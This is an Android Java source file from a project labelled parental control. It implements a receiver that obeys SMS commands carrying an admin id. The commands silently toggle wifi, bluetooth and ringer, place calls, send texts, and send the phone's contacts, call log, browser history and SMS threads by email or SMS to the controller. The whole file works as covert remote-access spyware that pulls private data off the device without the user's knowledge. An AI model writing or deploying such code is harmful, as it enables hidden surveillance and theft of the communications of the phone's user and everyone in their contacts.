package com.example.parentalcontrol;
import java.sql.Date;
import java.util.ArrayList;

import android.bluetooth.BluetoothAdapter;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class IncomingSmsReader extends BroadcastReceiver {
	Editor signs;
	SharedPreferences spSign;
	String[] pieces=null;
	Context con;
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.d("its check","Sms Received");
		con=context;
		String incomingNum="";
		spSign = context.getSharedPreferences("SignUp", Context.MODE_PRIVATE);
        signs = spSign.edit();
		
		Bundle bundle = intent.getExtras();
		SmsMessage[] msgs = null;
		String str = "";
		if(bundle != null){
			//---retrieve the SMS message received---
			Object[] pdus = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for(int i=0; i<msgs.length; i++){
				msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
				if(i==0) {	
					incomingNum= msgs[i].getOriginatingAddress();
					incomingNum=incomingNum.replace("+92", "0");
					Log.d("its check","incomingNumber : "+incomingNum);	
				}
				
				str += msgs[i].getMessageBody().toString(); 
			}
			str=str+" ";
			//---display the new SMS message---
			pieces=ExplodeFile(str, ' ');
			
			Log.d("its check", "Admin id : "+spSign.getString("id", ""));
			Log.d("its check", "incoming admin id : "+pieces[0]);
			if(pieces[0].equals(spSign.getString("id", ""))){
				Log.d("its check","Admin id confirmed");				
			//	Toast.makeText(context,"Id confirmed"+" "+pieces[1], Toast.LENGTH_LONG).show();
			if(pieces.length==2){	
				if(pieces[1].equals("wifion")){
					WifiManager wManager = (WifiManager)context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
					wManager.setWifiEnabled(true);
					Log.d("its check","wifi on");
				}
				else if(pieces[1].equals("wifioff")){
					WifiManager wManager = (WifiManager)context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
					wManager.setWifiEnabled(false); 
					Log.d("its check","wifi off");
				}
				else if(pieces[1].equals("silent")){
					AudioManager  am11= (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                    am11.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                    Log.d("its check","Silent mode");
				}
				else if(pieces[1].equals("ringer")){
				AudioManager  am11= (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                am11.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                Log.d("its check","Ringer mode enabled");
            	}
				else if(pieces[1].equals("bluetoothon")){
					BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();    
					if (!(mBluetoothAdapter.isEnabled())) {
					    mBluetoothAdapter.enable(); 
					    Log.d("its check","Bluetooth enable");
					} else{
						Log.d("its check","Bluetooth already enabled");
					}
				}
				else if(pieces[1].equals("bluetoothoff")){
					BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();    
					if (mBluetoothAdapter.isEnabled()) {
					    mBluetoothAdapter.disable(); 
					    Log.d("its check","Bluetooth disbled");
					} else{
						Log.d("its check","Already disabled bluetooth");
					}
				}
				else if(pieces[1].equals("contacts")){
					 SmsManager sms=SmsManager.getDefault();
					 ArrayList<String> parts = sms.divideMessage(contacts());
					 sms.sendMultipartTextMessage(incomingNum, null,parts, null, null);
				}	
				else if(pieces[1].equals("log")){
					String detail=getCallDetails();
					String add=spSign.getString("email","");
					Log.d("its check", add);
					if(add!="")
					{
						email_here e=new email_here();
						e.sendMail(add,"Call Log Details",detail);
					}
					else{
						Log.d("its check","Not valid mail id ! its empty");
					}
				}	
				else if(pieces[1].equals("history")){
					String detail=getBrowserHistory();
					String add=spSign.getString("email","");
					Log.d("its check",detail);
					if(add!="")
					{
						email_here e=new email_here();
						e.sendMail(add,"Browser History",detail);
					}
					else{
						Log.d("its check","Not valid mail id ! its empty");
					}
				}
				else if(pieces[1].equals("sample")){
					String detail=sample();
					String add=spSign.getString("email","");
					Log.d("its check","Sample :"+detail);
					if(add!="")
					{
						email_here e=new email_here();
						e.sendMail(add,"Samples",detail);
						
						// sms to incoming number

						 SmsManager sms = SmsManager.getDefault();
						 String ssm="Dear Admin ! Samples are sent to your mail id . This sms is sent to you automatically , this will not reply .. Thanks";
						 ArrayList<String> parts = sms.divideMessage(ssm);
						 sms.sendMultipartTextMessage(incomingNum, null,parts, null, null);
					}
					else{
						Log.d("its check","Not valid mail id ! its empty");
					}
				}
			}
			else if(pieces.length==3){
					Log.d("its check","length call "+pieces.length);
					if(pieces[2].equals("call")){
						Boolean val=validNum(pieces[1]);
						if(val)
						{
							Uri number = Uri.parse("tel:"+pieces[1]);
					        Intent callIntent = new Intent(Intent.ACTION_CALL, number);
					        callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					        context.startActivity(callIntent);
						}
						else{
							 SmsManager sms = SmsManager.getDefault();
							 String ssm="Dear Admin ! Phone Number is not valid , Number should be like 03345289564 . This sms is sent to you automatically , this will not reply .. Thanks";
							 ArrayList<String> parts = sms.divideMessage(ssm);
							 sms.sendMultipartTextMessage(incomingNum, null,parts, null, null);
							 Log.d("its check","Sms sent to  admin : "+incomingNum);
						}
					}
			
			}
			else if(pieces.length==4){
					//.d("its check","Sms sending to mail of : "+pieces[1]);
				if(pieces[2].equals("sms") ){	
				String add=spSign.getString("email","");
					email_here e=new email_here();
					Boolean val=validNum(pieces[1]);
					if(val)
						e.sendMail(add,"All Sms From : "+pieces[1],getAllSms(pieces[1],pieces[3]));
					else{
						 SmsManager sms = SmsManager.getDefault();
						 String ssm="Dear Admin ! Phone Number is not valid , Number should be like 03345289564 . This sms is sent to you automatically , this will not reply .. Thanks";
						 ArrayList<String> parts = sms.divideMessage(ssm);
						 sms.sendMultipartTextMessage(incomingNum, null,parts, null, null);
						 Log.d("its check","Sms sent to  admin : "+incomingNum);
					  }
					}
				
				else if(pieces[2].equals("send")){
					 SmsManager sms = SmsManager.getDefault();
					 Boolean validNum=true;
					 if(pieces[1].length()==11)
					 {
						 char[] number=pieces[1].toCharArray();
						 for(int i=0 ; i<11 ; i++){
							 if(!(number[i]>='0' && number[i]<='9')){
								 validNum=false;
								 Log.d("its check","invalid phone number");
							 }
						 }
					 }
					 else{
						 validNum=false;
					 }
					 if(validNum){
						 ArrayList<String> parts = sms.divideMessage(pieces[3]);
						 sms.sendMultipartTextMessage(pieces[1], null, parts, null, null);
						 Log.d("its check","Sms sent to : "+pieces[1]);
					 }else{
						 String ssm="Dear Admin ! Phone Number is not valid , Number should be like 03345289564 .For more info type id sample and send us. This sms is sent to you automatically , this will not reply .. Thanks";
						 ArrayList<String> parts = sms.divideMessage(ssm);
						 sms.sendMultipartTextMessage(incomingNum, null,parts, null, null);
						 Log.d("its check","Sms sent to  admin : "+incomingNum);
					}
				}
			}
			}
		}
	}
	public Boolean validNum(String num){
		 if(num.length()==11)
		 {
			 char[] number=num.toCharArray();
			 for(int i=0 ; i<11 ; i++){
				 if(!(number[i]>='0' && number[i]<='9')){
					 Log.d("its check","invalid phone number");
					 return false;
				}
			 }
		 }else return false;
		return true;
	}
	private String  getCallDetails() {
		String details="";
		StringBuffer sb = new StringBuffer();
		Cursor managedCursor =con.getContentResolver().query( CallLog.Calls.CONTENT_URI,null, null,null, null);
		int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER ); 
		int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
		int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
		sb.append( "Call Details :");

		while ( managedCursor.moveToNext() ) {
			String phNumber = managedCursor.getString( number );
			String callType = managedCursor.getString( type );
			String callDate = managedCursor.getString( date );
			Date callDayTime = new Date(Long.valueOf(callDate));
			Log.d("its check",callDate);
			String callDuration = managedCursor.getString( duration );
			String dir = null;
			int dircode = Integer.parseInt( callType );
			
			switch( dircode ) {
				case CallLog.Calls.OUTGOING_TYPE:
				dir = "OUTGOING";
				break;
			
				case CallLog.Calls.INCOMING_TYPE:
				dir = "INCOMING";
				break;
			
				case CallLog.Calls.MISSED_TYPE:
				dir = "MISSED";
				break;
			}
		
			details=details+"\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration;
			details=details+"\n----------------------------------";
		}
		managedCursor.close();
	//	Log.d("its check",sb.toString());
		return details;
		}

	public String[] ExplodeFile(String data,char Seperater){           
		char [] filee=data.toCharArray();                              
		String temp="";                                                
		String [] Result=new String[1];                                
		int resultCount=0;                                             
		for (int i = 0; i < filee.length; i++) {                       
			if(filee[i]==Seperater){                                   
				Result[resultCount++]=temp;                            
				if(temp.equals("send")){		
					Result=Increase(Result);
					Result[resultCount++]=data.substring(i+1,filee.length-1);
					break;
				}
				temp="";   
				if(i==filee.length-1)                                  
				{}else                                                 
					Result=Increase(Result);                           
			}else{                                                     
			temp+=filee[i];                                            
			}                                                          
		}                                                              
		return Result;                                                 
	}                                                                  
	public String[] Increase(String[] result) {                        
		String[] ans=new String[result.length+1];                      
		for (int i = 0; i < result.length; i++) {                      
			ans[i]=result[i];                                          
		}                                                              
		return ans;                                                    
	} 
	  public String  getBrowserHistory() {
		  	String list="";
		    String title = "";
		    String url = "";

		    
		    String[] proj = new String[] { Browser.BookmarkColumns.TITLE,Browser.BookmarkColumns.URL };
		    String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
		                                                            // 1 = bookmark
		    Cursor mCur = con.getContentResolver().query(Browser.BOOKMARKS_URI, proj,sel, null, null);
		    mCur.moveToFirst();

		    if (mCur.moveToFirst() && mCur.getCount() > 0) {
		        boolean cont = true;
		        while (mCur.isAfterLast() == false && cont) {
		            title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
		            url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
		            // Do something with title and url
		            list=list+"\n Title : "+title+"\n URL : "+url;
		            Log.d("its check", "title  : " + title+" : url : "+url);
		            mCur.moveToNext();
		        }
		    }

		    mCur.close();

		    return list;
		}
	public String getAllSms(String numm,String dd) {
		//numm is in the form of +923448765432
		numm="+92"+numm.substring(1);
		String smsMail="";
	    Uri message = Uri.parse("content://sms/");
	    ContentResolver cr = con.getContentResolver();
	    Cursor c = cr.query(message, null, null, null, null);
	    int smsCount=0;
	    int totalSMS = c.getCount();
	    if (c.moveToFirst()) {  
	        for (int i = 0; i < totalSMS; i++) {
	        	if(numm.equals(c.getString(c.getColumnIndexOrThrow("address"))))
	        	{
	        		Date receiveDate = new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date"))));
	        		String type="";
	        		if(dd.equals("all")){
	        			if((c.getString(c.getColumnIndexOrThrow("type")).equals("1"))){
	        				type="received";
	        			}else{
	        				type="sent";
	        			}
	        			smsCount++;
	        			smsMail=smsMail+"\n -------------------------*******Message # "+smsCount+"*******---------------------------"
	        					+"\n Date : "+receiveDate.toString()
	        					+"\n Type : "+ type +
	        				   "\n Message : "+c.getString(c.getColumnIndexOrThrow("body"));
	        		}
	        		if((receiveDate.toString()).equals(dd))
	        		{
	        			if((c.getString(c.getColumnIndexOrThrow("type")).equals("1"))){
	        				type="received";
	        			}else{
	        				type="sent";
	        			}
	        		smsCount++;
        			smsMail=smsMail+"\n -------------------------*******Message # "+smsCount+"*******---------------------------"
	        					+"\n Type : "+ type +
	        				   "\n Message : "+c.getString(c.getColumnIndexOrThrow("body"));
	        		}
	        	}
	            c.moveToNext();
	        }
	    }
	    c.close();
	//    Log.d("its check","Mail :"+smsMail);
	    return smsMail;
	}
	public String contacts(){
			 Cursor phones = con.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null, null);
			 String Name="",Number="";  
			 String mess="";
			 while (phones.moveToNext())
		         {
		          Name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
		          Number=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
		          
		          mess=mess+"\n"+Name+" : "+Number;
		        
		          Log.d("mess   : ",mess);
		          }
		return mess;
	}
	public String sample(){
		String sam="";
		sam=" Type Required sms from any mobile to get respective results." +
				"\n Sample Messages : " +
				"\n To enable Wifi :"+"Id wifion"+ //2
				"\n To enable Bluetooth :"+"Id wifioff"+ //2
				"\n To enable Silent mode :"+"Id silent"+ //2
				"\n To enable Ringer mode : :"+"Id ringer"+ //2
				"\n To get call Logs on mail address :"+"Id log"+ //2
				"\n To get Browser history  :"+"Id history"+ //2
				"\n To get PhoneBook on email address : "+"Id contacts"+ //2
				"\n To call from this mobile to a specific number :"+"Id 03441234567 call"+ //3
				"\n To get all sms of a specific number :"+"Id 03441234567 sms all"+//4
				"\n To get sms of a specific number on specific date :"+"Id 03441234567 sms 2014-12-08"+ //4
				"\n To send sms to a specific number from this mobile :"+"Id 03441234567 send messageBody";//4 
				
		return sam;
	}
}
